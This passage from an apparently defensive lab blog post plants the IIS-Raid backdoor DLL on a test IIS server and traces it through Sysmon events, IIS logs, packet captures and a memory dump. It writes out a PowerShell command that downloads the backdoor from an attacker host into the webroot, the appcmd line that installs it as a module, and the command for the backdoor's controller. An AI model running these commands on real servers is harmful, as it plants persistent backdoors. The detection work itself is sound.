<p><a href="/wp-content/uploads/2022/09/IIS-Raid-Strings-2.png" data-lbwps-width="1770" data-lbwps-height="965" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/IIS-Raid-Strings-2-500x273.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-Strings-2-500x273.png" alt="" width="500" height="273" class="aligncenter size-medium wp-image-5501" srcset="/wp-content/uploads/2022/09/IIS-Raid-Strings-2-500x273.png 500w, /wp-content/uploads/2022/09/IIS-Raid-Strings-2-1024x558.png 1024w, /wp-content/uploads/2022/09/IIS-Raid-Strings-2-768x419.png 768w, /wp-content/uploads/2022/09/IIS-Raid-Strings-2-1536x837.png 1536w, /wp-content/uploads/2022/09/IIS-Raid-Strings-2.png 1770w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<p>It is important to keep in mind that there is absolutely no obfuscation or packing applied to this .dll, which means there is plenty of opportunity to experiment with defense evasion here.</p>
<h4><span class="ez-toc-section" id="Uploading_The_Extension"></span>Uploading The Extension<span class="ez-toc-section-end"></span></h4>
<p>Now that the extension is compiled, it can be uploaded to the IIS server by leveraging something like PowerShell via the web shell to download the extension from a remote host:</p>
<pre>powershell invoke-webrequest "http://kali.external-threat.net/iis-backdoor.dll" -Outfile "C:\inetpub\wwwroot\bin\IIS-backdoor.dll"</pre>
<p>The Sysmon/Operational logs captured this activity in a similar manner to the earlier web shell testing under Event IDs 1 (Process Create) &amp; 11 (File Created):</p>
<p><a href="/wp-content/uploads/2022/10/IIS-Raid-Upload.png" data-lbwps-width="1191" data-lbwps-height="945" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/10/IIS-Raid-Upload-500x397.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/10/IIS-Raid-Upload-500x397.png" alt="" width="500" height="397" class="aligncenter size-medium wp-image-5925" srcset="/wp-content/uploads/2022/10/IIS-Raid-Upload-500x397.png 500w, /wp-content/uploads/2022/10/IIS-Raid-Upload-1024x812.png 1024w, /wp-content/uploads/2022/10/IIS-Raid-Upload-768x609.png 768w, /wp-content/uploads/2022/10/IIS-Raid-Upload.png 1191w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<p><a href="/wp-content/uploads/2022/10/IIS-Raid-Upload-2.png" data-lbwps-width="1211" data-lbwps-height="938" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/10/IIS-Raid-Upload-2-500x387.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/10/IIS-Raid-Upload-2-500x387.png" alt="" width="500" height="387" class="aligncenter size-medium wp-image-5926" srcset="/wp-content/uploads/2022/10/IIS-Raid-Upload-2-500x387.png 500w, /wp-content/uploads/2022/10/IIS-Raid-Upload-2-1024x793.png 1024w, /wp-content/uploads/2022/10/IIS-Raid-Upload-2-768x595.png 768w, /wp-content/uploads/2022/10/IIS-Raid-Upload-2.png 1211w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<h4><span class="ez-toc-section" id="Installing_The_IIS_Extension_Using_AppCmd"></span>Installing The IIS Extension Using AppCmd<span class="ez-toc-section-end"></span></h4>
<p>Now that the extension is uploaded to the server, it needs to be installed. There are multiple tools/methods available for this part:</p>
<ul>
<li>AppCmd.exe</li>
<li>Global Assembly Cache (GAC) PowerShell API</li>
<li>Gacutil.exe</li>
<li>Manual add via Web.Config</li>
</ul>
<p>AppCmd is basically the go to tool for administering IIS 7+ via command line, it is known for being easy to work with and exposes all the key server management features, so that is what I am going to use here.</p>
<p>Attempting to install the IIS module using AppCmd via the web shell:</p>
<pre>C:\Windows\system32\inetsrv\appcmd.exe install module /name:IIS-Backdoor-via-appcmd /image:"C:\inetpub\wwwroot\bin\IIS-Backdoor.dll" /add:true</pre>
<p>Under the default permissions with the default application pool identity, this step fails:</p>
<p><a href="/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Fail.png" data-lbwps-width="778" data-lbwps-height="209" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Fail-500x134.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Fail-500x134.png" alt="" width="500" height="134" class="aligncenter size-medium wp-image-5507" srcset="/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Fail-500x134.png 500w, /wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Fail-768x206.png 768w, /wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Fail.png 778w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<p>To simulate a privilege escalation or terrible misconfiguration (both of which are very plausible scenarios), the application pool identity was modified from the default account to the local system account:</p>
<p><a href="/wp-content/uploads/2022/09/IIS-AppPool-System.png" data-lbwps-width="1207" data-lbwps-height="318" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/IIS-AppPool-System-500x132.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-AppPool-System-500x132.png" alt="" width="500" height="132" class="aligncenter size-medium wp-image-5508" srcset="/wp-content/uploads/2022/09/IIS-AppPool-System-500x132.png 500w, /wp-content/uploads/2022/09/IIS-AppPool-System-1024x270.png 1024w, /wp-content/uploads/2022/09/IIS-AppPool-System-768x202.png 768w, /wp-content/uploads/2022/09/IIS-AppPool-System.png 1207w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<p>The web shell reflects the change:</p>
<p><a href="/wp-content/uploads/2022/09/IIS-AppPool-System-Webshell.png" data-lbwps-width="793" data-lbwps-height="203" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/IIS-AppPool-System-Webshell-500x128.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-AppPool-System-Webshell-500x128.png" alt="" width="500" height="128" class="aligncenter size-medium wp-image-5509" srcset="/wp-content/uploads/2022/09/IIS-AppPool-System-Webshell-500x128.png 500w, /wp-content/uploads/2022/09/IIS-AppPool-System-Webshell-768x197.png 768w, /wp-content/uploads/2022/09/IIS-AppPool-System-Webshell.png 793w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<p>And now the extension installs successfully:</p>
<p><a href="/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success.png" data-lbwps-width="1029" data-lbwps-height="217" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-500x105.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-500x105.png" alt="" width="500" height="105" class="aligncenter size-medium wp-image-5513" srcset="/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-500x105.png 500w, /wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-1024x216.png 1024w, /wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-768x162.png 768w, /wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success.png 1029w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<p>All of this activity is still being performed under the web shell, so as expected the Sysmon/Operational logs captured this with Sysmon Event ID 1 (Process Create) under the application pool worker process (w3wp.exe) as nt authority\system with the entire AppCmd command line:  </p>
<p><a href="/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-Sysmon-EID-1.png" data-lbwps-width="1285" data-lbwps-height="944" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-Sysmon-EID-1-500x367.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-Sysmon-EID-1-500x367.png" alt="" width="500" height="367" class="aligncenter size-medium wp-image-5510" srcset="/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-Sysmon-EID-1-500x367.png 500w, /wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-Sysmon-EID-1-1024x752.png 1024w, /wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-Sysmon-EID-1-768x564.png 768w, /wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-Sysmon-EID-1.png 1285w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<p>The extension is now visible in the IIS Manager under Modules:</p>
<p><a href="/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-IIS-Manager.png" data-lbwps-width="1920" data-lbwps-height="790" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-IIS-Manager-500x206.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-IIS-Manager-500x206.png" alt="" width="500" height="206" class="aligncenter size-medium wp-image-5511" srcset="/wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-IIS-Manager-500x206.png 500w, /wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-IIS-Manager-1024x421.png 1024w, /wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-IIS-Manager-768x316.png 768w, /wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-IIS-Manager-1536x632.png 1536w, /wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-IIS-Manager-300x125.png 300w, /wp-content/uploads/2022/09/IIS-Raid-Install-AppCmd-Success-IIS-Manager.png 1920w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<h3><span class="ez-toc-section" id="Interacting_With_IIS-Raid"></span>Interacting With IIS-Raid<span class="ez-toc-section-end"></span></h3>
<p>Interacting with the IIS server running the IIS-Raid extension is as easy as running the python controller script from the kali/attacker host with the parameters that were specified in the IIS-Raid-master\module\Functions.h earlier:</p>
<pre># python iis_controller.py --url http://iis.robwillis.info --password RobWasHere --header X-Rob-Variations</pre>
<p>IIS-Raid has the following commands available:</p>
<ul>
<li>Help</li>
<li>Cmd</li>
<li>Dump</li>
<li>Exit</li>
<li>Inject</li>
</ul>
<p>The screenshot below is what it looks like when the attacker connects to and interacts with the backdoor from the remote Kali host running “whoami &amp;&amp; hostname”:</p>
<p><a href="/wp-content/uploads/2022/09/IIS-Raid-Whoami-Hostname.png" data-lbwps-width="1617" data-lbwps-height="867" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/IIS-Raid-Whoami-Hostname-500x268.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-Whoami-Hostname-500x268.png" alt="" width="500" height="268" class="aligncenter size-medium wp-image-5580" srcset="/wp-content/uploads/2022/09/IIS-Raid-Whoami-Hostname-500x268.png 500w, /wp-content/uploads/2022/09/IIS-Raid-Whoami-Hostname-1024x549.png 1024w, /wp-content/uploads/2022/09/IIS-Raid-Whoami-Hostname-768x412.png 768w, /wp-content/uploads/2022/09/IIS-Raid-Whoami-Hostname-1536x824.png 1536w, /wp-content/uploads/2022/09/IIS-Raid-Whoami-Hostname.png 1617w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<p>On the Windows server, the IIS logs captured a few GET requests from the attacker host (192.168.90.214) against the root site but with no page or file specified, which makes it a little harder to tell what exactly happened here:</p>
<p><a href="/wp-content/uploads/2022/09/IIS-Raid-webserver-logs.png" data-lbwps-width="1533" data-lbwps-height="177" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/IIS-Raid-webserver-logs-500x58.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-webserver-logs-500x58.png" alt="" width="500" height="58" class="aligncenter size-medium wp-image-5583" srcset="/wp-content/uploads/2022/09/IIS-Raid-webserver-logs-500x58.png 500w, /wp-content/uploads/2022/09/IIS-Raid-webserver-logs-1024x118.png 1024w, /wp-content/uploads/2022/09/IIS-Raid-webserver-logs-768x89.png 768w, /wp-content/uploads/2022/09/IIS-Raid-webserver-logs.png 1533w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<p>The Sysmon/Operational logs captured this activity under Event ID 1 (Process Create):</p>
<p><a href="/wp-content/uploads/2022/09/IIS-Raid-Whoami-Hostname-EID-1.png" data-lbwps-width="1290" data-lbwps-height="766" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/IIS-Raid-Whoami-Hostname-EID-1-500x297.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-Whoami-Hostname-EID-1-500x297.png" alt="" width="500" height="297" class="aligncenter size-medium wp-image-5586" srcset="/wp-content/uploads/2022/09/IIS-Raid-Whoami-Hostname-EID-1-500x297.png 500w, /wp-content/uploads/2022/09/IIS-Raid-Whoami-Hostname-EID-1-1024x608.png 1024w, /wp-content/uploads/2022/09/IIS-Raid-Whoami-Hostname-EID-1-768x456.png 768w, /wp-content/uploads/2022/09/IIS-Raid-Whoami-Hostname-EID-1.png 1290w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<p>This is where I was not sure how extension based activity would look as far as the execution and process chaining, but it ends up looking nearly identical to the web shell activity. Notice the image (c:\windows\system32\cmd.exe), command line (/c whoami &amp;&amp; hostname), and that the parent process is the IIS worker process (w3wp.exe) running under the updated IIS application pool identity (nt authority\system). This means that any existing detections for web shells/w3wp.exe activity are already a step in the right direction.</p>
<p>Now to take a look at the packet capture in Wireshark:</p>
<p><a href="/wp-content/uploads/2022/09/IIS-Raid-Pcap-Edit-2.png" data-lbwps-width="1913" data-lbwps-height="1034" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/IIS-Raid-Pcap-Edit-2-500x270.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-Pcap-Edit-2-500x270.png" alt="" width="500" height="270" class="aligncenter size-medium wp-image-5596" srcset="/wp-content/uploads/2022/09/IIS-Raid-Pcap-Edit-2-500x270.png 500w, /wp-content/uploads/2022/09/IIS-Raid-Pcap-Edit-2-1024x553.png 1024w, /wp-content/uploads/2022/09/IIS-Raid-Pcap-Edit-2-768x415.png 768w, /wp-content/uploads/2022/09/IIS-Raid-Pcap-Edit-2-1536x830.png 1536w, /wp-content/uploads/2022/09/IIS-Raid-Pcap-Edit-2.png 1913w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<p>One of the first items that stands out is that the command was passed using the “X-Rob-Variations” header (configured via the Functions.h) and the response appears to be returned utilizing the same header but base64 encoded. Decoding the base64 via PowerShell:</p>
<pre>
PS &gt; [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("bnQgYXV0aG9yaXR5XHN5c3RlbQ0KVk1XLUwtSUlTMDENCg=="))
</pre>
<p>Reveals the response the attacker observed:<br>
nt authority\system<br>
VMW-L-IIS01</p>
<p>What we are not seeing here, is what exactly the attacker was interacting with. When investigating the web shell activity earlier, we could see that the attacker was interacting with a specific page (cmdasp.aspx), which after manual review, was determined to contain malicious code. With the IIS extension/IIS-Raid, the page that was served up appears to be the web servers default document:</p>
<p><a href="/wp-content/uploads/2022/09/IIS-Raid-Pcap-2-edit.png" data-lbwps-width="1920" data-lbwps-height="1056" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/IIS-Raid-Pcap-2-edit-500x275.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-Pcap-2-edit-500x275.png" alt="" width="500" height="275" class="aligncenter size-medium wp-image-5607" srcset="/wp-content/uploads/2022/09/IIS-Raid-Pcap-2-edit-500x275.png 500w, /wp-content/uploads/2022/09/IIS-Raid-Pcap-2-edit-1024x563.png 1024w, /wp-content/uploads/2022/09/IIS-Raid-Pcap-2-edit-768x422.png 768w, /wp-content/uploads/2022/09/IIS-Raid-Pcap-2-edit-1536x845.png 1536w, /wp-content/uploads/2022/09/IIS-Raid-Pcap-2-edit.png 1920w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<p>The “Default Document” is actually a setting that is defined on the IIS server that when a request is made to the base site (iis.robwillis.info/ in this case), the server will always return this page as the default:</p>
<p><a href="/wp-content/uploads/2022/09/IIS-Default-Document-Edit.png" data-lbwps-width="1917" data-lbwps-height="1039" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/IIS-Default-Document-Edit-500x271.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Default-Document-Edit-500x271.png" alt="" width="500" height="271" class="aligncenter size-medium wp-image-5610" srcset="/wp-content/uploads/2022/09/IIS-Default-Document-Edit-500x271.png 500w, /wp-content/uploads/2022/09/IIS-Default-Document-Edit-1024x555.png 1024w, /wp-content/uploads/2022/09/IIS-Default-Document-Edit-768x416.png 768w, /wp-content/uploads/2022/09/IIS-Default-Document-Edit-1536x833.png 1536w, /wp-content/uploads/2022/09/IIS-Default-Document-Edit.png 1917w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<p>With this in mind, the default document that was served was the “iisstart.htm” file and it does not appear to contain any sort of malicious code. </p>
<p>At this point we need to take a deeper look into what is going on with the w3wp.exe process…</p>
<h3><span class="ez-toc-section" id="ImageDLLModule_Loads_%E2%80%93_w3wpexe"></span>Image/DLL/Module Loads – w3wp.exe <span class="ez-toc-section-end"></span></h3>
<p>I want to cover two different methods for investigating this section. The first method will be using Sysmon and is meant to be fast and scalable, similar to what would be available in an EDR solution. The second method uses a minidump and debugger like Visual Studio or WinDbg. This method is more time consuming and requires access to the host but works well in a bind where minimal logging is available. With either method, the end result will be very similar.</p>
<h4><span class="ez-toc-section" id="Method_1_%E2%80%93_Sysmon_Event_ID_7_%E2%80%93_Image_Loaded"></span>Method 1 – Sysmon Event ID 7 – Image Loaded<span class="ez-toc-section-end"></span></h4>
<p>Before diving into Sysmon Event ID 7, I want to point out that this event is disabled by default and needs to be enabled with the -l option. Why is it disabled? It can be very high in volume and CPU usage, potentially impacting the performance of the host. Keep this in mind before deploying to any hosts in production!</p>
<p>To test this event, I created a simple Sysmon rule limiting the logging of Event ID 7 to the w3wp.exe image:</p>
<pre>
	&lt;!--SYSMON EVENT ID 7 : DLL (IMAGE) LOADED BY PROCESS [ImageLoad]--&gt;
		&lt;!--COMMENT:	Can cause high system load, disabled by default.--&gt;
		&lt;!--COMMENT:	[ https://attack.mitre.org/wiki/Technique/T1073 ] [ https://attack.mitre.org/wiki/Technique/T1038 ] [ https://attack.mitre.org/wiki/Technique/T1034 ] --&gt;

		&lt;!--DATA: UtcTime, ProcessGuid, ProcessId, Image, ImageLoaded, Hashes, Signed, Signature, SignatureStatus--&gt;
	&lt;RuleGroup name=&quot;&quot; groupRelation=&quot;or&quot;&gt;
		&lt;ImageLoad onmatch=&quot;include&quot;&gt;
			&lt;!--NOTE: Using &quot;include&quot; with no rules means nothing in this section will be logged--&gt;
			&lt;Rule groupRelation=&quot;or&quot;&gt;
				&lt;Image condition=&quot;end with&quot;&gt;w3wp.exe&lt;/Image&gt;				
			&lt;/Rule&gt;
		&lt;/ImageLoad&gt;
	&lt;/RuleGroup&gt;
</pre>
<p>And then to update the Sysmon configuration and enable the EID 7 – “Image loaded” events with the -l:</p>
<pre>
Sysmon64.exe -c sysmonconfig-export.xml -l
</pre>
<p>The screen shot below is an example of what a legit Microsoft extension looks like when being loaded by the IIS worker process:</p>
<p><a href="/wp-content/uploads/2022/09/IIS-Raid-Sysmon-Module-Load-Legit-1.png" data-lbwps-width="1235" data-lbwps-height="938" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/IIS-Raid-Sysmon-Module-Load-Legit-1-500x380.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-Sysmon-Module-Load-Legit-1-500x380.png" alt="" width="500" height="380" class="aligncenter size-medium wp-image-5636" srcset="/wp-content/uploads/2022/09/IIS-Raid-Sysmon-Module-Load-Legit-1-500x380.png 500w, /wp-content/uploads/2022/09/IIS-Raid-Sysmon-Module-Load-Legit-1-1024x778.png 1024w, /wp-content/uploads/2022/09/IIS-Raid-Sysmon-Module-Load-Legit-1-768x583.png 768w, /wp-content/uploads/2022/09/IIS-Raid-Sysmon-Module-Load-Legit-1.png 1235w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<p>There’s a ton of useful information in these events like the Image, ImageLoaded, FileVersion, Description, Product, Company, OriginalFileName, Hashes, Signing information with status and the User.</p>
<p>And this is what the IIS-Raid/IIS-Backdoor.dll event looks like:</p>
<p><a href="/wp-content/uploads/2022/09/IIS-Raid-Sysmon-Module-Load-Backdoor-1.png" data-lbwps-width="1240" data-lbwps-height="943" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/IIS-Raid-Sysmon-Module-Load-Backdoor-1-500x380.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-Sysmon-Module-Load-Backdoor-1-500x380.png" alt="" width="500" height="380" class="aligncenter size-medium wp-image-5637" srcset="/wp-content/uploads/2022/09/IIS-Raid-Sysmon-Module-Load-Backdoor-1-500x380.png 500w, /wp-content/uploads/2022/09/IIS-Raid-Sysmon-Module-Load-Backdoor-1-1024x779.png 1024w, /wp-content/uploads/2022/09/IIS-Raid-Sysmon-Module-Load-Backdoor-1-768x584.png 768w, /wp-content/uploads/2022/09/IIS-Raid-Sysmon-Module-Load-Backdoor-1.png 1240w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<p>There are definitely a few red flags here, like the fact that a lot of the values (FileVersion, Description, Signature) are blank, but most of these items are things that could be easily modified to blend in. The log also contains hash info that can then be used help establish prevalence in an environment via something like Splunk/ELK/EDR as well as to validate/detect outliers via 3rd party malware engines like VirusTotal. Since all of the other dlls being loaded by the w3wp.exe process are legitimate Microsoft dlls, the backdoor does stand out as unique.</p>
<h4><span class="ez-toc-section" id="Method_2_%E2%80%93_User_Mode_MiniDump_Task_Manager_Debugger_Visual_Studio"></span>Method 2 – User Mode  MiniDump (Task Manager) &amp; Debugger (Visual Studio)<span class="ez-toc-section-end"></span></h4>
<p>A minidump or .dmp file is a snapshot of a live process. These dumps contain a bunch of useful information like the memory, stack traces, and what we are looking for in this case – module/dll loads. Windows exposes this feature via api, so it can be called multiple ways with one of the easiest being Task Manager. Most modern EDR solutions will also have tools to support taking memory dumps.</p>
<p>To create a minidump using Task Manager, select the Details tab, then right click on the process (w3wp.exe) and click “Create dump file”:	 </p>
<p><a href="/wp-content/uploads/2022/09/IIS-Raid-w3wp-taskmanager-minidump.png" data-lbwps-width="800" data-lbwps-height="799" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/IIS-Raid-w3wp-taskmanager-minidump-500x499.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-w3wp-taskmanager-minidump-500x499.png" alt="" width="500" height="499" class="aligncenter size-medium wp-image-5615" srcset="/wp-content/uploads/2022/09/IIS-Raid-w3wp-taskmanager-minidump-500x499.png 500w, /wp-content/uploads/2022/09/IIS-Raid-w3wp-taskmanager-minidump-150x150.png 150w, /wp-content/uploads/2022/09/IIS-Raid-w3wp-taskmanager-minidump-768x767.png 768w, /wp-content/uploads/2022/09/IIS-Raid-w3wp-taskmanager-minidump.png 800w" sizes="auto, (max-width: 500px) 100vw, 500px"></a>	 </p>
<p>And now to open the .dmp in a debugger like Visual Studio Community:	 </p>
<p><a href="/wp-content/uploads/2022/09/IIS-w3wp-dmp.png" data-lbwps-width="1918" data-lbwps-height="946" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/IIS-w3wp-dmp-500x247.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-w3wp-dmp-500x247.png" alt="" width="500" height="247" class="aligncenter size-medium wp-image-5617" srcset="/wp-content/uploads/2022/09/IIS-w3wp-dmp-500x247.png 500w, /wp-content/uploads/2022/09/IIS-w3wp-dmp-1024x505.png 1024w, /wp-content/uploads/2022/09/IIS-w3wp-dmp-768x379.png 768w, /wp-content/uploads/2022/09/IIS-w3wp-dmp-1536x758.png 1536w, /wp-content/uploads/2022/09/IIS-w3wp-dmp-644x320.png 644w, /wp-content/uploads/2022/09/IIS-w3wp-dmp.png 1918w" sizes="auto, (max-width: 500px) 100vw, 500px"></a>	 </p>
<p>Looking through the modules list for outliers, there is one that stands out due to the version (0.0.0.0) and location (it’s the only dll in C:\inetpub\wwwroot\bin\, which is often a writable directory):	 </p>
<p><a href="/wp-content/uploads/2022/09/IIS-w3wp-dmp-backdoor.png" data-lbwps-width="1676" data-lbwps-height="952" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/IIS-w3wp-dmp-backdoor-500x284.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-w3wp-dmp-backdoor-500x284.png" alt="" width="500" height="284" class="aligncenter size-medium wp-image-5618" srcset="/wp-content/uploads/2022/09/IIS-w3wp-dmp-backdoor-500x284.png 500w, /wp-content/uploads/2022/09/IIS-w3wp-dmp-backdoor-1024x582.png 1024w, /wp-content/uploads/2022/09/IIS-w3wp-dmp-backdoor-768x436.png 768w, /wp-content/uploads/2022/09/IIS-w3wp-dmp-backdoor-1536x872.png 1536w, /wp-content/uploads/2022/09/IIS-w3wp-dmp-backdoor.png 1676w" sizes="auto, (max-width: 500px) 100vw, 500px"></a>	 </p>
<p>If the module did not stand out based off of the few attributes that are initially displayed here, we at least now have a list of all of the modules that were loaded to begin investigating them by gathering similar information to what was available in the Sysmon logs (FileVersion, Description, Product, Company, OriginalFileName, Hashes, Signing info). Just like in the previous method, once this information has been gathered, it can then be used to establish prevalence in the environment and to validate/detect outliers via 3rd party malware engines like VirusTotal.</p>
<h3><span class="ez-toc-section" id="Wrapping_Things_Up%E2%80%A6"></span>Wrapping Things Up…<span class="ez-toc-section-end"></span></h3>
<p>Using the information discovered above, we now have a file worth taking a a deeper look at (C:\inetpub\wwwroot\bin\IIS-Backdoor.dll). Performing a basic string based analysis reveals the link to cmd.exe that was observed in both the Sysmon Events and the network traffic/pcap along with the headers/values that were passed:</p>
<p><a href="/wp-content/uploads/2022/10/IIS-Backdoor-Strings.png" data-lbwps-width="1787" data-lbwps-height="981" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/10/IIS-Backdoor-Strings-500x274.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/10/IIS-Backdoor-Strings-500x274.png" alt="" width="500" height="274" class="aligncenter size-medium wp-image-5677" srcset="/wp-content/uploads/2022/10/IIS-Backdoor-Strings-500x274.png 500w, /wp-content/uploads/2022/10/IIS-Backdoor-Strings-1024x562.png 1024w, /wp-content/uploads/2022/10/IIS-Backdoor-Strings-768x422.png 768w, /wp-content/uploads/2022/10/IIS-Backdoor-Strings-1536x843.png 1536w, /wp-content/uploads/2022/10/IIS-Backdoor-Strings.png 1787w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<p>We now know who the attacker was (192.168.90.214), how they interacted with the server (iis.robwillis.info/ – IIS-Backdoor.dll), what was requested/executed (cmd.exe /c whoami &amp;&amp; hostname), and what the response was (nt authority\system, VMW-L-IIS01).</p>
<h3><span class="ez-toc-section" id="Defensive_Event_Summary"></span>Defensive Event Summary<span class="ez-toc-section-end"></span></h3>
<p>Below is a summary of all of the logs and/or sources that were used to investigate the activity covered in this post:</p>
<h4><span class="ez-toc-section" id="Web_Shell"></span>Web Shell<span class="ez-toc-section-end"></span></h4>
<p></p>
<table>
<tr>
<td width="20%"><strong>Log/Source</strong></td>
<td width="20%"><strong>Event ID(s)</strong></td>
<td width="60%"><strong>Notes</strong></td>
</tr>
<tr>
<td>Windows Defender/Operational</td>
<td>1116 (Detected) &amp; 1117 (Action Taken)</td>
<td>cmdasp.aspx detected as Backdoor:ASP/Webshell (Exclusion was added)</td>
</tr>
<tr>
<td>IIS logs</td>
<td></td>
<td>Showed the attacker IP, user-agent, uri (cmdasp.aspx) and method (POST)</td>
</tr>
<tr>
<td>Sysmon/Operational</td>
<td>1 (Process Create)</td>
<td>Captured the command line activity (cmd.exe /c whoami &amp;&amp; hostname) under the IIS worker process (w3wp.exe)</td>
</tr>
<tr>
<td>Packet Capture</td>
<td></td>
<td>Showed how the web shell was interacted with (POST &amp; View state) along with the commands and the response that the attacker observed</td>
</tr>
<tr>
<td>File</td>
<td></td>
<td>Manual review of the cmdasp.aspx file on the server confirms it is a web shell</td>
</tr>
</table>
<h4><span class="ez-toc-section" id="IIS_ExtensionIIS-RaidIIS-Backdoordll"></span>IIS Extension/IIS-Raid/IIS-Backdoor.dll<span class="ez-toc-section-end"></span></h4>
<h5><span class="ez-toc-section" id="Upload"></span>Upload<span class="ez-toc-section-end"></span></h5>
<p></p>
<table>
<tr>
<td width="20%"><strong>Log/Source</strong></td>
<td width="20%"><strong>Event ID(s)</strong></td>
<td width="60%"><strong>Notes</strong></td>
</tr>
<tr>
<td>Sysmon/Operational</td>
<td>1 (Process Create) &amp; 11 (File Created)</td>
<td>Captured the download of IIS-Backdoor.dll from the remote domain to the local IIS directory using PowerShell via the web shell/w3wp.exe</td>
</tr>
<tr>
<td>Windows Defender/Operational</td>
<td>1116 (Detected) &amp; 1117 (Action Taken)</td>
<td>IIS-Backdoor.dll detected as Backdoor:Win32/IISBackdoor.A (Exclusion was added)</td>
</tr>
</table>
<h5><span class="ez-toc-section" id="Install"></span>Install<span class="ez-toc-section-end"></span></h5>
<p></p>
<table>
<tr>
<td width="20%"><strong>Log/Source</strong></td>
<td width="20%"><strong>Event ID(s)</strong></td>
<td width="60%"><strong>Notes</strong></td>
</tr>
<tr>
<td>Sysmon/Operational</td>
<td>1 (Process Create)</td>
<td>Captured the installation of IIS-Backdoor using AppCmd via the web shell/w3wp.exe</td>
</tr>
</table>
